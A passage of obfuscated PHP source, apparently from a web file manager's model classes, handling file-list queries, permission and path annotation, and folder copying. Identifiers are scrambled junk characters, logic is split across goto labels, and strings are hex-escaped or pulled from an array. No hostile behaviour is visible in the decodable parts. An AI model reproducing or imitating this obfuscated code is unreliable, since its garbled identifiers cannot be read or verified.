$a»ğ—©…Œ’[$BÓµ“¥ÓË¼][$Dõ“¯Ñ‹¥Ì[2]]; $b„‡ˆ¨¥ñ  .= "\123\x45\114\105\x43\x54\x20\x2a\x20\106\x52\117\115\x20\50\x53\105\114\x45\103\124\40\47{$b‚š…íğ³à}\137\x68\141\x73\106\x69\x6c\x65\47\x20\141\163\40\150\141\x73\x2c\143\157\165\x6e\x74\50\61\51\40\141\163\x20\x68\x61\163\103\x6f\x75\156\x74\x20\x46\122\x4f\x4d\40\140{$c×îµœ«ÉÂ}\140\x20\12\x9\11\x9\11\x9\167\150\145\x72\x65\40\160\x61\162\145\156\x74\x49\104\75{$b‚š…íğ³à}\x20\141\156\144\x20\151\x73\106\157\x6c\x64\x65\x72\x3d\60\x20\141\156\x64\40\x69\x73\104\145\154\x65\164\x65\x3d\60\x29\40\x61\163\x20\x74\x62\61\137{$b‚š…íğ³à}\x20\x75\x6e\x69\x6f\x6e\40\x61\x6c\x6c\40\xa\11\11\x9\x9\x9\123\x45\114\105\103\x54\x20\52\x20\x46\122\x4f\115\x20\50\123\x45\x4c\105\103\x54\40\x27{$b‚š…íğ³à}\137\x68\141\163\x46\x6f\x6c\x64\x65\x72\47\x20\x61\x73\x20\x68\141\163\x46\x69\x6c\x65\x2c\x63\157\x75\x6e\164\50\61\51\40\141\x73\x20\150\x61\163\103\157\165\x6e\164\x20\106\122\x4f\x4d\40\x60{$c×îµœ«ÉÂ}\140\40\xa\11\x9\11\x9\11\167\x68\145\162\x65\40\x70\x61\x72\145\x6e\164\x49\x44\x3d{$b‚š…íğ³à}\x20\141\x6e\x64\x20\x69\x73\x46\157\154\144\x65\x72\75\x31\40\141\x6e\x64\40\151\163\104\x65\x6c\x65\x74\145\75\60\x29\40\x61\x73\x20\164\142\x32\137{$b‚š…íğ³à}\x20\x75\x6e\x69\x6f\x6e\40\x61\x6c\154\x20"; } if ((strlen($b„‡ˆ¨¥ñ ) >= $B¯Š¾á­œ || $BÓµ“¥ÓË¼ == $AäŒ®Á£¯ - 1) && $b„‡ˆ¨¥ñ ) { $b„‡ˆ¨¥ñ  = substr($b„‡ˆ¨¥ñ , 0, -strlen($Dõ“¯Ñ‹¥Ì[86])); $d‡œâÓ¤ = $this->query($b„‡ˆ¨¥ñ ); $a¹§ŞÙÒ§Í = array_merge($a¹§ŞÙÒ§Í, $d‡œâÓ¤); $b„‡ˆ¨¥ñ  = $Dõ“¯Ñ‹¥Ì[1]; } } $a¹§ŞÙÒ§Í = array_to_keyvalue($a¹§ŞÙÒ§Í, $Dõ“¯Ñ‹¥Ì[87]); foreach ($a»ğ—©…Œ’ as &$Aº¢ÉØŸ¡‰) { if ($Aº¢ÉØŸ¡‰[$Dõ“¯Ñ‹¥Ì[6]]) { unset($Aº¢ÉØŸ¡‰[$Dõ“¯Ñ‹¥Ì[11]]); $Aº¢ÉØŸ¡‰[$Dõ“¯Ñ‹¥Ì[88]] = intval($a¹§ŞÙÒ§Í[$Aº¢ÉØŸ¡‰[$Dõ“¯Ñ‹¥Ì[2]] . $Dõ“¯Ñ‹¥Ì[89]][$Dõ“¯Ñ‹¥Ì[90]]); $Aº¢ÉØŸ¡‰[$Dõ“¯Ñ‹¥Ì[91]] = intval($a¹§ŞÙÒ§Í[$Aº¢ÉØŸ¡‰[$Dõ“¯Ñ‹¥Ì[2]] . $Dõ“¯Ñ‹¥Ì[92]][$Dõ“¯Ñ‹¥Ì[90]]); } } goto AáÔ·„Ÿì; b°¸–²¥¾¦: $Dõ“¯Ñ‹¥Ì =& $_SERVER[»]; $b„‡ˆ¨¥ñ  = $Dõ“¯Ñ‹¥Ì[85]; $a¹§ŞÙÒ§Í = array(); goto e‰ˆ‚ñ²’Ğ; e‰ˆ‚ñ²’Ğ: $B¯Š¾á­œ = 1024 * 50; $AäŒ®Á£¯ = count($a»ğ—©…Œ’); $c×îµœ«ÉÂ = $this->tablePrefix . $this->tableName; goto FáÖ‹ˆö˜Á; AáÔ·„Ÿì: } protected function _listAppendAuth(&$E•ÔĞ‰Á) { goto ašÃÊ“”Ÿ¬; b³éÆî¢¸½: foreach ($E•ÔĞ‰Á as $cºÕÔøœ· => &$Bãµ®™ÑÜª) { $Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[16]] = $aÀ‘é‰Î­è[$Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[2]]]; if (!$Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[16]] && $Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[9]] == self::TYPE_GROUP) { $Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[16]] = Action($F±Ã¼÷æ›‚[94])->pathGroupAuthMake($Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[95]]); if (!$Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[16]] && !$GLOBALS[$F±Ã¼÷æ›‚[96]]) { $Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[97]] = !1; $Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[98]] = !1; } } if ($Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[16]]) { $Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[97]] = AuthModel::authCheckEdit($Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[16]][$F±Ã¼÷æ›‚[17]]); $Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[98]] = AuthModel::authCheckView($Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[16]][$F±Ã¼÷æ›‚[17]]); } $this->groupPathDisplay($Bãµ®™ÑÜª); } goto BœÜòÜ§Šˆ; Dˆ…¼ø¦Èâ: if (!$E™î  ¥) { return; } $b—‘ÑÓçœà = array_to_keyvalue($E•ÔĞ‰Á, $F±Ã¼÷æ›‚[2]); $aÀ‘é‰Î­è = Model($F±Ã¼÷æ›‚[93])->getSourceList($E™î  ¥, $b—‘ÑÓçœà); goto b³éÆî¢¸½; ašÃÊ“”Ÿ¬: $F±Ã¼÷æ›‚ =& $_SERVER[»]; $E™î  ¥ = array(); foreach ($E•ÔĞ‰Á as $Bãµ®™ÑÜª) { if ($Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[9]] == self::TYPE_GROUP) { $E™î  ¥[] = $Bãµ®™ÑÜª[$F±Ã¼÷æ›‚[2]]; } } goto Dˆ…¼ø¦Èâ; BœÜòÜ§Šˆ: } public function groupPathDisplay(&$F¡å·Œ¶œÆ) { goto bÔ•²ÑÂ¬„; bÔ•²ÑÂ¬„: $EÑÇ™®—ç— =& $_SERVER[»]; if ($F¡å·Œ¶œÆ[$EÑÇ™®—ç—[9]] != self::TYPE_GROUP) { return; } $bÏÕ¬£İ¤³ = Model($EÑÇ™®—ç—[99])->getInfo($F¡å·Œ¶œÆ[$EÑÇ™®—ç—[95]]); goto Dœ®Á¶ÔÉé; bíÖ Äå³Š: $F¡å·Œ¶œÆ[$EÑÇ™®—ç—[101]] = $bÏÕ¬£İ¤³[$EÑÇ™®—ç—[102]]; $F¡å·Œ¶œÆ[$EÑÇ™®—ç—[23]] = $bÏÕ¬£İ¤³[$EÑÇ™®—ç—[100]]; $F¡å·Œ¶œÆ[$EÑÇ™®—ç—[103]] = $bÏÕ¬£İ¤³[$EÑÇ™®—ç—[104]]; goto eñ§êÊÀ±à; eñ§êÊÀ±à: $F¡å·Œ¶œÆ[$EÑÇ™®—ç—[105]] = $B–«Ü‹É„ë . $bÏÕ¬£İ¤³[$EÑÇ™®—ç—[37]][$EÑÇ™®—ç—[2]]; goto FÆÆ·Ó·Ø; Dœ®Á¶ÔÉé: $b‹–ØÌÓ·× = $this->parentLevelArray($bÏÕ¬£İ¤³[$EÑÇ™®—ç—[100]]); $B–«Ü‹É„ë = $EÑÇ™®—ç—[1]; foreach ($b‹–ØÌÓ·× as $b·ƒ±º»ò‡) { $D¾¼ò÷ë¢ = Model($EÑÇ™®—ç—[99])->getInfo($b·ƒ±º»ò‡); $B–«Ü‹É„ë .= $D¾¼ò÷ë¢[$EÑÇ™®—ç—[37]][$EÑÇ™®—ç—[2]] . $EÑÇ™®—ç—[15]; } goto bíÖ Äå³Š; FÆÆ·Ó·Ø: } protected function _listAppendPath(&$b±Åò¤¬ÃÏ) { goto C™³ÁéÔ«; B»ë¬¥¼Èœ: $F›ÃåªŸ–â = array(); foreach ($B¥ğ—ê¢¨ as $EîšĞš÷²ƒ => $A¢Ùäªö„Ï) { if (!$A¢Ùäªö„Ï) { $F›ÃåªŸ–â[] = $EîšĞš÷²ƒ; } } if ($F›ÃåªŸ–â) { $Cã°É˜æ¢ = array($FÛóÎèŒ¡¶[26] => array($FÛóÎèŒ¡¶[27], $F›ÃåªŸ–â)); if (count($F›ÃåªŸ–â) == 1) { $b›ê‡°Ò«õ = $this->sourceInfo($F›ÃåªŸ–â[0]); $b›ê‡°Ò«õ = is_array($b›ê‡°Ò«õ) ? array($b›ê‡°Ò«õ) : !1; } else { $b›ê‡°Ò«õ = $this->field($FÛóÎèŒ¡¶[106])->where($Cã°É˜æ¢)->select(); } $C¤àÎ Öêõ = array_to_keyvalue($b›ê‡°Ò«õ, $FÛóÎèŒ¡¶[2], $FÛóÎèŒ¡¶[32]); $B¥ğ—ê¢¨ = array_merge_index($B¥ğ—ê¢¨, $C¤àÎ Öêõ); } goto d¬™øƒ³¹™; C™³ÁéÔ«: $FÛóÎèŒ¡¶ =& $_SERVER[»]; $B¥ğ—ê¢¨ = array(); foreach ($b±Åò¤¬ÃÏ as &$dŸè‡ùÇí) { $B¥ğ—ê¢¨[$dŸè‡ùÇí[$FÛóÎèŒ¡¶[2]]] = $dŸè‡ùÇí[$FÛóÎèŒ¡¶[32]]; $aï½–­ƒÅ¡ = $this->parentLevelArray($dŸè‡ùÇí[$FÛóÎèŒ¡¶[100]]); array_shift($aï½–­ƒÅ¡); foreach ($aï½–­ƒÅ¡ as $BôàĞÈØ–¬) { if (!isset($B¥ğ—ê¢¨[$BôàĞÈØ–¬])) { $B¥ğ—ê¢¨[$BôàĞÈØ–¬] = 0; } } } goto B»ë¬¥¼Èœ; d¬™øƒ³¹™: foreach ($b±Åò¤¬ÃÏ as &$dŸè‡ùÇí) { goto d®ÒŒ‰ŠìŠ; FŒŠÍ‚ÛÒ‹: $CÉ´²Ì¾µ = trim($dŸè‡ùÇí[$FÛóÎèŒ¡¶[108]], $FÛóÎèŒ¡¶[107]); if ($dŸè‡ùÇí[$FÛóÎèŒ¡¶[102]] == $FÛóÎèŒ¡¶[110] && $CÉ´²Ì¾µ) { $dŸè‡ùÇí[$FÛóÎèŒ¡¶[32]] = $CÉ´²Ì¾µ; } goto dÓÆ©ê¤ñ²; d®ÒŒ‰ŠìŠ: $aï½–­ƒÅ¡ = $this->parentLevelArray($dŸè‡ùÇí[$FÛóÎèŒ¡¶[100]]); $Eå¡ºÛàåª = $this->_listAppendPathRoot($dŸè‡ùÇí, $aï½–­ƒÅ¡); foreach ($aï½–­ƒÅ¡ as $BôàĞÈØ–¬) { if (isset($B¥ğ—ê¢¨[$BôàĞÈØ–¬])) { $Eå¡ºÛàåª .= $B¥ğ—ê¢¨[$BôàĞÈØ–¬] . $FÛóÎèŒ¡¶[107]; } } goto D‘ÛŠÈ˜Œ·; D‘ÛŠÈ˜Œ·: if ($aï½–­ƒÅ¡) { $Eå¡ºÛàåª .= $dŸè‡ùÇí[$FÛóÎèŒ¡¶[32]]; } if ($dŸè‡ùÇí[$FÛóÎèŒ¡¶[6]]) { $Eå¡ºÛàåª .= $FÛóÎèŒ¡¶[107]; } $dŸè‡ùÇí[$FÛóÎèŒ¡¶[108]] = str_replace($FÛóÎèŒ¡¶[109], $FÛóÎèŒ¡¶[107], $Eå¡ºÛàåª); goto FŒŠÍ‚ÛÒ‹; dÓÆ©ê¤ñ²: } goto D¦¢Å„¢ó‹; D¦¢Å„¢ó‹: } protected function _listAppendPathRoot(&$eôØßğ©, $BŒ¿’•˜„¢) { $eôÙñÂŸİ± =& $_SERVER[»]; $BÌ—±…Œ—ö = $eôÙñÂŸİ±[1]; if ($eôØßğ©[$eôÙñÂŸİ±[9]] == self::TYPE_USER) { if ($eôØßğ©[$eôÙñÂŸİ±[95]] == USER_ID) { $BÌ—±…Œ—ö = LNG($eôÙñÂŸİ±[111]); if (!$BŒ¿’•˜„¢) { $eôØßğ©[$eôÙñÂŸİ±[32]] = $BÌ—±…Œ—ö; } } else { $b‹¿Á ¼ù¤ = Model($eôÙñÂŸİ±[112])->getInfoSimple($eôØßğ©[$eôÙñÂŸİ±[95]]); $BÌ—±…Œ—ö = $eôÙñÂŸİ±[113] . $b‹¿Á ¼ù¤[$eôÙñÂŸİ±[32]] . $eôÙñÂŸİ±[114]; } } else { if ($eôØßğ©[$eôÙñÂŸİ±[9]] == self::TYPE_GROUP) { $b‹¿Á ¼ù¤ = Model($eôÙñÂŸİ±[99])->getInfoSimple($eôØßğ©[$eôÙñÂŸİ±[95]]); $BÌ—±…Œ—ö = $b‹¿Á ¼ù¤[$eôÙñÂŸİ±[32]]; } else { if ($eôØßğ©[$eôÙñÂŸİ±[9]] == self::TYPE_SYSTEM) { $b‹¿Á ¼ù¤ = $this->sourceInfo($BŒ¿’•˜„¢[0], !0); $BÌ—±…Œ—ö = $b‹¿Á ¼ù¤[$eôÙñÂŸİ±[32]]; } } } $BÌ—±…Œ—ö = $BÌ—±…Œ—ö ? $eôÙñÂŸİ±[107] . $BÌ—±…Œ—ö . $eôÙñÂŸİ±[107] : $eôÙñÂŸİ±[107]; return $BÌ—±…Œ—ö; } protected function _listAppendUser(&$EÂÄÎ£®âŞ) { $e‘ÊÖ¤ÅŠÃ =& $_SERVER[»]; $bø‡Õ®š÷ = array_to_keyvalue($EÂÄÎ£®âŞ, $e‘ÊÖ¤ÅŠÃ[1], $e‘ÊÖ¤ÅŠÃ[20]); $dÆÏ²Şªœ— = array_to_keyvalue($EÂÄÎ£®âŞ, $e‘ÊÖ¤ÅŠÃ[1], $e‘ÊÖ¤ÅŠÃ[21]); $a«Öô×šÜ = array_merge($bø‡Õ®š÷, $dÆÏ²Şªœ—); $DÎÃÚ¢Õˆ = Model($e‘ÊÖ¤ÅŠÃ[115])->userListInfo($a«Öô×šÜ); foreach ($EÂÄÎ£®âŞ as &$F¦‡òïÑ›) { $D¾„›‘ô²¾ = $F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[20]]; $F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[20]] = $DÎÃÚ¢Õˆ[$D¾„›‘ô²¾] ? $DÎÃÚ¢Õˆ[$D¾„›‘ô²¾] : !1; $D¾„›‘ô²¾ = $F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[21]]; $F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[21]] = $DÎÃÚ¢Õˆ[$D¾„›‘ô²¾] ? $DÎÃÚ¢Õˆ[$D¾„›‘ô²¾] : !1; if ($F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[62]] && $F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[62]][$e‘ÊÖ¤ÅŠÃ[116]]) { $cĞÏ†›±ÈÃ = $GLOBALS[$e‘ÊÖ¤ÅŠÃ[117]][$e‘ÊÖ¤ÅŠÃ[118]][$e‘ÊÖ¤ÅŠÃ[119]]; if ($F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[62]][$e‘ÊÖ¤ÅŠÃ[120]] <= time() - $cĞÏ†›±ÈÃ) { $this->metaSet($F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[2]], $e‘ÊÖ¤ÅŠÃ[116], null); $this->metaSet($F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[2]], $e‘ÊÖ¤ÅŠÃ[120], null); unset($F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[62]][$e‘ÊÖ¤ÅŠÃ[116]]); continue; } $F´‡øŒ÷¾Ö = $F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[62]][$e‘ÊÖ¤ÅŠÃ[116]]; $F¦‡òïÑ›[$e‘ÊÖ¤ÅŠÃ[62]][$e‘ÊÖ¤ÅŠÃ[121]] = Model($e‘ÊÖ¤ÅŠÃ[115])->getInfoSimpleOuter($F´‡øŒ÷¾Ö); } } } public function parentLevelArray($DöÒºÇç³Ü) { $a‰™ƒĞ« =& $_SERVER[»]; $DöÒºÇç³Ü = explode($a‰™ƒĞ«[15], trim($DöÒºÇç³Ü, $a‰™ƒĞ«[15])); return array_remove_value($DöÒºÇç³Ü, $a‰™ƒĞ«[110]); } public function listAll($d™—ãëìƒ‹) { goto cñÃï”Á‚„; cñÃï”Á‚„: $aŒÛ×¬¸ó¡ =& $_SERVER[»]; $e°ƒœãØÂ¬ = $this->sourceInfo($d™—ãëìƒ‹); $Dì¯¤ƒÄâ¿ = array($aŒÛ×¬¸ó¡[122] => array($aŒÛ×¬¸ó¡[123], $e°ƒœãØÂ¬[$aŒÛ×¬¸ó¡[100]] . $d™—ãëìƒ‹ . $aŒÛ×¬¸ó¡[124]), $aŒÛ×¬¸ó¡[125] => 0); goto C÷åêª¤ø£; B·œ”«Ï¦: $CáÛã©Ë²˜ = array_to_keyvalue($CáÛã©Ë²˜, $aŒÛ×¬¸ó¡[2]); $bäÓõ±­ìØ = "\57{$e°ƒœãØÂ¬[$aŒÛ×¬¸ó¡[32]]}\57"; $bäÓõ±­ìØ = $bäÓõ±­ìØ == $aŒÛ×¬¸ó¡[109] ? $aŒÛ×¬¸ó¡[107] : $bäÓõ±­ìØ; goto FÙÂğÜ“; cÅéãå”¥ƒ: $this->_listAppendAuth($CáÛã©Ë²˜); $this->_listAppendUser($CáÛã©Ë²˜); $this->_listAppendPath($CáÛã©Ë²˜); goto B·œ”«Ï¦; C÷åêª¤ø£: $D÷»ÏÙÒ = $aŒÛ×¬¸ó¡[126]; $DÈ¶œİ°Ã = "\114\x45\x46\x54\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\x69\157\x5f\x66\151\154\145\x20\146\151\154\x65\x20\x6f\x6e\40\163\157\165\162\143\145\x2e\146\151\154\x65\111\104\x20\75\40\x66\151\154\145\56\x66\151\x6c\x65\111\104"; $CáÛã©Ë²˜ = $this->alias($aŒÛ×¬¸ó¡[127])->field($D÷»ÏÙÒ)->where($Dì¯¤ƒÄâ¿)->join($DÈ¶œİ°Ã)->select(); goto cÅéãå”¥ƒ; FÙÂğÜ“: $AŞÓßÏÛßô = array(); foreach ($CáÛã©Ë²˜ as $dæ‡îÙ÷‡‹ => $F¥¿¸·õõ) { goto f§£Í˜Ûë; BöÊ•¶‚…: $E¹‡íÒøø = str_replace($aŒÛ×¬¸ó¡[109], $aŒÛ×¬¸ó¡[107], $E¹‡íÒøø); $E¹‡íÒøø = str_replace($aŒÛ×¬¸ó¡[109], $aŒÛ×¬¸ó¡[107], $E¹‡íÒøø); $a“Òôğ—™’ = array($aŒÛ×¬¸ó¡[33] => str_replace($aŒÛ×¬¸ó¡[109], $aŒÛ×¬¸ó¡[107], $E¹‡íÒøø), $aŒÛ×¬¸ó¡[128] => intval($F¥¿¸·õõ[$aŒÛ×¬¸ó¡[6]]), $aŒÛ×¬¸ó¡[37] => $this->pathInfoFilter($F¥¿¸·õõ, !0)); goto d’ùíá»œî; f§£Í˜Ûë: $e¡ØÑè¥Ø„ = $this->parentLevelArray($F¥¿¸·õõ[$aŒÛ×¬¸ó¡[100]]); array_shift($e¡ØÑè¥Ø„); $E¹‡íÒøø = $bäÓõ±­ìØ; goto DšˆâÀİõÕ; d’ùíá»œî: if (!$F¥¿¸·õõ[$aŒÛ×¬¸ó¡[6]]) { $a“Òôğ—™’[$aŒÛ×¬¸ó¡[129]] = $F¥¿¸·õõ[$aŒÛ×¬¸ó¡[129]]; $a“Òôğ—™’[$aŒÛ×¬¸ó¡[130]] = $F¥¿¸·õõ[$aŒÛ×¬¸ó¡[4]]; } $AŞÓßÏÛßô[] = $a“Òôğ—™’; goto c’ëôî¸—Ò; DšˆâÀİõÕ: for ($fÛ¬ˆñ×ƒÛ = 0; $fÛ¬ˆñ×ƒÛ < count($e¡ØÑè¥Ø„); $fÛ¬ˆñ×ƒÛ++) { $E¹‡íÒøø .= $CáÛã©Ë²˜[$e¡ØÑè¥Ø„[$fÛ¬ˆñ×ƒÛ]][$aŒÛ×¬¸ó¡[32]] . $aŒÛ×¬¸ó¡[107]; } $E¹‡íÒøø .= $F¥¿¸·õõ[$aŒÛ×¬¸ó¡[32]]; if ($F¥¿¸·õõ[$aŒÛ×¬¸ó¡[6]]) { $E¹‡íÒøø .= $aŒÛ×¬¸ó¡[107]; } goto BöÊ•¶‚…; c’ëôî¸—Ò: } return $AŞÓßÏÛßô; goto F÷‡ÈåÇÑè; F÷‡ÈåÇÑè: } } class SourceListMoveModel extends SourceListModel { public function isParentOf($eñâ¹„Ú¤, $cÊ–ª½ï×) { goto DÂöÅ¿õšë; d­†÷ÃÂ™: return $AíÊ¡”½‘‹; goto AÀ˜©…Å®©; AåöŒ…‚µ¦: $CÛÊŠÔÎÈ = $AŒ×õëÂœï[$eÌ­ä«¬Ü[374]] . $AŒ×õëÂœï[$eÌ­ä«¬Ü[375]] . $eÌ­ä«¬Ü[47]; $d£âÌ˜Ş×  = $aÓ»ä˜Ñ„È[$eÌ­ä«¬Ü[374]] . $aÓ»ä˜Ñ„È[$eÌ­ä«¬Ü[375]] . $eÌ­ä«¬Ü[47]; $AíÊ¡”½‘‹ = strpos($d£âÌ˜Ş× , $CÛÊŠÔÎÈ) === 0; goto d­†÷ÃÂ™; DÂöÅ¿õšë: $eÌ­ä«¬Ü =& $_SERVER[İë¬“ÅÒÛ›]; $AŒ×õëÂœï = $this->sourceInfo($eñâ¹„Ú¤); $aÓ»ä˜Ñ„È = $this->sourceInfo($cÊ–ª½ï×); goto AåöŒ…‚µ¦; AÀ˜©…Å®©: } public function copy($B¸Ê‰ôÍçó, $D‡µºíÒ–ç, $Cß¹¤’ÏË­ = REPEAT_REPLACE, $bÈ•â¨ î‹ = '') { goto EÖéà¥ö·; fÁ¾Ö÷’Ú—: $this->updateModifyTime($D‡µºíÒ–ç); return $C¦áãÇñ•Á; goto EßåƒçîçÂ; f£èç‡§¡: if (!$eœ›Šã° || !$bÉƒ¬º„‚ || $bÉƒ¬º„‚[$aà×öÈ†ï¤[376]] != $aà×öÈ†ï¤[377]) { return !1; } if ($this->isParentOf($B¸Ê‰ôÍçó, $D‡µºíÒ–ç)) { return !1; } $aÃÒŸÇòÊ = array($aà×öÈ†ï¤[378] => array(), $aà×öÈ†ï¤[379] => array(), $aà×öÈ†ï¤[380] => array()); goto a—è†íÒ; EÖéà¥ö·: $aà×öÈ†ï¤ =& $_SERVER[İë¬“ÅÒÛ›]; $eœ›Šã° = $this->sourceInfo($B¸Ê‰ôÍçó); $bÉƒ¬º„‚ = $this->sourceInfo($D‡µºíÒ–ç); goto f£èç‡§¡; dŒ‚îŞ­Ä”: $this->saveAll($aÃÒŸÇòÊ[$aà×öÈ†ï¤[380]]); Model($aà×öÈ†ï¤[164])->linkAdd($aÃÒŸÇòÊ[$aà×öÈ†ï¤[378]]); $this->folderSizeReset($D‡µºíÒ–ç); goto fÁ¾Ö÷’Ú—; b¼×‡•Óğ…: if ($eœ›Šã°[$aà×öÈ†ï¤[376]] == $aà×öÈ†ï¤[377] && $cÄ§˜¨¼ğ == $C¦áãÇñ•Á) { $this->folderSizeResetChildren($cÄ§˜¨¼ğ); } Model($aà×öÈ†ï¤[381])->addAll($aÃÒŸÇòÊ[$aà×öÈ†ï¤[379]], array(), !0); Model($aà×öÈ†ï¤[382])->eventCopy($C¦áãÇñ•Á); goto dŒ‚îŞ­Ä”; a—è†íÒ: $cÄ§˜¨¼ğ = $this->fileNameExistCache($D‡µºíÒ–ç, $eœ›Šã°[$aà×öÈ†ï¤[28]]); $C¦áãÇñ•Á = $this->_copy($B¸Ê‰ôÍçó, $D‡µºíÒ–ç, $Cß¹¤’ÏË­, $aÃÒŸÇòÊ, !0, $bÈ•â¨ î‹); $this->_childrenListClear(); goto b¼×‡•Óğ…; EßåƒçîçÂ: } private function _copy($f¨«Õ·©‹¦, $CŠ“óæ³, $cã¡ÊÁ‰ê…, &$Ašõ…±î¿, $BÑå¾‘î, $a‡Şº£´÷ = '') { goto bë¤Æ®† ›; bë¤Æ®† ›: $Då†¤Óšë =& $_SERVER[İë¬“ÅÒÛ›]; $eõùéÍ©çÆ = $this->sourceInfoCache($f¨«Õ·©‹¦); $cäâÎç— © = $eõùéÍ©çÆ[$Då†¤Óšë[376]] == $Då†¤Óšë[377]; goto E§…‹ë‡£å; E§…‹ë‡£å: $Fã ÍêŸ– = $a‡Şº£´÷ ? $a‡Şº£´÷ : $eõùéÍ©çÆ[$Då†¤Óšë[28]]; $cŒ·Åœ…øÛ = $this->fileNameExistCache($CŠ“óæ³, $Fã ÍêŸ–); if ($BÑå¾‘î) { $this->_childrenAllMake($f¨«Õ·©‹¦); if ($cäâÎç— © && $cŒ·Åœ…øÛ) { $this->_childrenAllMake($cŒ·Åœ…øÛ); } } goto CÏ¿çÚ¬; f†Â†æ·Ã: return $eâĞŞÓ¸; goto b†Ù…™ºİ; CÏ¿çÚ¬: if (!$cŒ·Åœ…øÛ) { return $this->_copyCreate($f¨«Õ·©‹¦, $CŠ“óæ³, $Fã ÍêŸ–, $Ašõ…±î¿); } $eâĞŞÓ¸ = $cŒ·Åœ…øÛ; if ($cäâÎç— ©) { if ($cã¡ÊÁ‰ê… == REPEAT_RENAME_FOLDER) { $Fã ÍêŸ– = $this->fileNameAutoCache($CŠ“óæ³, $Fã ÍêŸ–, $cã¡ÊÁ‰ê…, $cäâÎç— ©); $eâĞŞÓ¸ = $this->_copyCreate($f¨«Õ·©‹¦, $CŠ“óæ³, $Fã ÍêŸ–, $Ašõ…±î¿); } else { $cŸˆç¢¡”ğ = $this->_childrenList($f¨«Õ·©‹¦); foreach ($cŸˆç¢¡”ğ as $C“¬öÏÈõµ) { $this->_copy($C“¬öÏÈõµ[$Då†¤Óšë[375]], $cŒ·Åœ…øÛ, $cã¡ÊÁ‰ê…, $Ašõ…±î¿, !1); } } } else { if ($cã¡ÊÁ‰ê… == REPEAT_RENAME || $cã¡ÊÁ‰ê… == REPEAT_RENAME_FOLDER) { $Fã ÍêŸ– = $this->fileNameAutoCache($CŠ“óæ³, $Fã ÍêŸ–, $cã¡ÊÁ‰ê…, $cäâÎç— ©); $eâĞŞÓ¸ = $this->_copyCreate($f¨«Õ·©‹¦, $CŠ“óæ³, $Fã ÍêŸ–, $Ašõ…±î¿); } else { if ($cã¡ÊÁ‰ê… == REPEAT_REPLACE) { $Cê ‰±‚ßÖ = $this->sourceInfoCache($cŒ·Åœ…øÛ); $d•Ğò›ŠÄ = $this->fileHistory($Cê ‰±‚ßÖ, $eõùéÍ©çÆ[$Då†¤Óšë[383]], $eõùéÍ©çÆ[$Då†¤Óšë[78]]); if ($d•Ğò›ŠÄ) { $Ašõ…±î¿[$Då†¤Óšë[378]][] = $eõùéÍ©çÆ[$Då†¤Óšë[383]]; } } else { if ($cã¡ÊÁ‰ê… == REPEAT_SKIP) { } } } } goto f†Â†æ·Ã; b†Ù…™ºİ: } private function _copyCreate($F‰‹Š‹ÕË§, $C¬³Šî»Õä, $fÖ˜„‡«ä†, &$eñìö–ñ‰) { goto a¹ŒÉ°ò¢™; D”¬£çêÂ: $C“š¿ÅÃé° = $this->_makeItemData($Dæ„Êš‹¼‚, $bĞÌğš…Ñ¥, $fÖ˜„‡«ä†); Hook::trigger($a“µ´í†º³[384], $C“š¿ÅÃé°); $eÎ·ÏŸ = $this->add($C“š¿ÅÃé°); goto d½ÏÄñĞ­¡; F›øÉ¾­î: if (count($cõğèŸŒö«) == 0) { return $eÎ·ÏŸ; } $A†èĞâ–æ = $this->sourceInfo($eÎ·ÏŸ); foreach ($cõğèŸŒö« as $a²ŸßÂ¯¿…) { $bÎÌ‡ãæ¢ì = $this->_makeItemData($a²ŸßÂ¯¿…, $A†èĞâ–æ, $a²ŸßÂ¯¿…[$a“µ´í†º³[28]]); $bÎÌ‡ãæ¢ì[$a“µ´í†º³[374]] = $a²ŸßÂ¯¿…[$a“µ´í†º³[374]]; $Då½äÓˆ®°[] = $bÎÌ‡ãæ¢ì; } goto e²Çàçó¬¢; d½ÏÄñĞ­¡: $C»„µÓËÔÁ = array($a“µ´í†º³[375] => $eÎ·ÏŸ, $a“µ´í†º³[28] => $fÖ˜„‡«ä†); $this->_copyApplyMeta($C»„µÓËÔÁ, $eñìö–ñ‰); if ($Dæ„Êš‹¼‚[$a“µ´í†º³[376]] != $a“µ´í†º³[377]) { $eñìö–ñ‰[$a“µ´í†º³[378]][] = $Dæ„Êš‹¼‚[$a“µ´í†º³[383]]; return $eÎ·ÏŸ; } goto C±¼íÂšë; dé½®„óŠÓ: return $eÎ·ÏŸ; goto A˜ÊÈ”Ï²Û; c²”¨ŠÅ¿÷: foreach ($D…ŒĞÈÒáë as $a²ŸßÂ¯¿…) { $D„•õ¨ïœ• = $a²ŸßÂ¯¿…[$a“µ´í†º³[375]]; $cØÙŒõ­½¤ = $this->_childrenMatch($DÁ‘šÄç‡, $a²ŸßÂ¯¿…, $A†èĞâ–æ); $DßíÕ¡Ÿ‘¨[] = array($a“µ´í†º³[375], $D„•õ¨ïœ•, $a“µ´í†º³[385], $cØÙŒõ­½¤[$a“µ´í†º³[385]]); $a«º¬™œô[] = array($a“µ´í†º³[375], $D„•õ¨ïœ•, $a“µ´í†º³[374], $cØÙŒõ­½¤[$a“µ´í†º³[374]]); $this->_copyApplyMeta($a²ŸßÂ¯¿…, $eñìö–ñ‰); if 